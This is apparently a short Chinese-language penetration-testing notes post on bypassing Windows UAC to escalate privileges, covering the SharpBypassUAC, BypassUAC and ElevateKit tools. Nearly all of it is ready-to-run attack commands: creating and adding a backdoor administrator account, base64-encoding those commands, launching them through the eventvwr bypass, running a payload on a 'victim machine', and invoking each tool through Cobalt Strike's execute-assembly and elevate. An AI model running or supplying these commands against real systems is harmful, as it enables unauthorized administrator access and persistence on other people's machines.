---
title: bypassUAC提权
date: 2025-03-03 13:38:01
updated: 2025-03-03 14:03:00
tags:
  - 内网
  - 权限提升
---
# SharpBypassUAC

[GitHub - FatRodzianko/SharpBypassUAC: C# tool for UAC bypasses](https://github.com/fatrodzianko/sharpbypassuac)

```shell
# 原始命令
net user test 1qaz@WSX /add
net localgroup administrators test /add
# base64 编码
bmV0IHVzZXIgdGVzdCAxcWF6QFdTWCAvYWRk
bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgdGVzdCAvYWRk

# SharpBypassUAC 完整命令
SharpBypassUAC.exe -b eventvwr -e bmV0IHVzZXIgdGVzdCAxcWF6QFdTWCAvYWRk
SharpBypassUAC.exe -b eventvwr -e bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgdGVzdCAvYWRk

# cobalstrike下使用(本地/root/SharpBypassUAC.exe)
execute-assembly /root/SharpBypassUAC.exe -b eventvwr -e bmV0IHVzZXIgdGVzdCAxcWF6QFdTWCAvYWRk
execute-assembly /root/SharpBypassUAC.exe -b eventvwr -e bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgdGVzdCAvYWRk
```

# uac弹窗钓鱼

[GitHub - 0xlane/BypassUAC: Use ICMLuaUtil to Bypass UAC!](https://github.com/0xlane/BypassUAC)

## 受害机上使用

```shell
uac.exe C:\Users\dev\Desktop\artifact.exe
```

## cobalstrike下使用

```shell
execute-assembly /root/uac.exe C:\Users\dev\Desktop\artifact.exe
execute C:\Users\dev\Desktop\uac.exe C:\Users\dev\Desktop\artifact.exe
```

# ElevateKit

[GitHub - rsmudge/ElevateKit: The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strike’s Beacon payload.](https://github.com/rsmudge/ElevateKit/)

```shell
beacon> elevate
# elevate uac模块名 监听器名称
elevate uac-eventvwr httpLis
```